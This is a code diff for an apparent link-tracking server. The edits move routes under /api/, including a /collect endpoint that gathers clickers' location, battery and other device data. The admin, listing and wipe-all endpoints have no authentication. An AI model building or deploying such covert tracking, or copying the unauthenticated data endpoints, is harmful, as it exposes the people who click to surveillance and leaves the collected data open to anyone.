@@ -69,8 +69,8 @@ function getBaseUrl(req) {
   return `${proto}://${host}`;
 }
 
-// Create a tracking link (POST or GET for demo)
-app.post('/create', (req, res) => {
+// API compatibility routes for local development and Vercel-style frontend
+app.post('/api/create', (req, res) => {
   const { target, note } = req.body;
   if (!target) return res.status(400).json({ error: 'target URL required' });
 
@@ -78,9 +78,7 @@ app.post('/create', (req, res) => {
   const links = readJson(LINKS_FILE);
   links[id] = { target, note: note || null, createdAt: new Date().toISOString() };
   writeJson(LINKS_FILE, links);
-  // Allow the client to suggest a base (e.g. the origin it was served from).
-  // Only accept it if it parses as a URL and matches the request's Origin/Referer
-  // (to avoid creating links that appear to come from arbitrary hosts).
+
   let base = null;
   try {
     const suggested = req.body && req.body.base ? String(req.body.base).replace(/\/$/, '') : null;
@@ -100,8 +98,7 @@ app.post('/create', (req, res) => {
   res.json({ id, url });
 });
 
-// Simple GET interface to create via query (for quick testing)
-app.get('/create', (req, res) => {
+app.get('/api/create', (req, res) => {
   const target = req.query.target;
   if (!target) return res.status(400).send('Please provide ?target=https://example.com');
   const id = makeId();
@@ -198,7 +195,7 @@ app.get('/r/:id', (req, res) => {
 });
 
 // Collect client-provided payload (location, battery, etc.)
-app.post('/collect', (req, res) => {
+app.post(['/collect', '/api/collect'], (req, res) => {
   const { id, at, client } = req.body || {};
   if (!id) return res.status(400).json({ error: 'missing id' });
 
@@ -210,8 +207,8 @@ app.post('/collect', (req, res) => {
 });
 
 // Admin: view link info and clicks (for demo only; no auth)
-app.get('/admin/:id', (req, res) => {
-  const id = req.params.id;
+app.get('/api/admin', (req, res) => {
+  const id = req.query.id;
   const links = readJson(LINKS_FILE);
   const link = links[id];
   if (!link) return res.status(404).json({ error: 'not found' });
@@ -228,23 +225,25 @@ app.get('/', (req, res) => {
 });
 
 // Return all links (for UI listing)
-app.get('/links', (req, res) => {
+app.get('/api/links', (req, res) => {
   const links = readJson(LINKS_FILE);
   res.json(links);
 });
 
 // Delete all links and clicks (wipe history)
-app.delete('/links', (req, res) => {
+app.delete('/api/links', (req, res) => {
   writeJson(LINKS_FILE, {});
   writeJson(CLICKS_FILE, {});
   res.json({ ok: true });
 });
 
 // Delete a single link and its clicks
-app.delete('/links/:id', (req, res) => {
-  const id = req.params.id;
+app.delete('/api/delete', (req, res) => {
+  const id = req.query.id;
+  if (!id) return res.status(400).json({ error: 'id required' });
   const links = readJson(LINKS_FILE);
   if (!links[id]) return res.status(404).json({ error: 'not found' });
+
   delete links[id];
   writeJson(LINKS_FILE, links);
   const clicks = readJson(CLICKS_FILE);
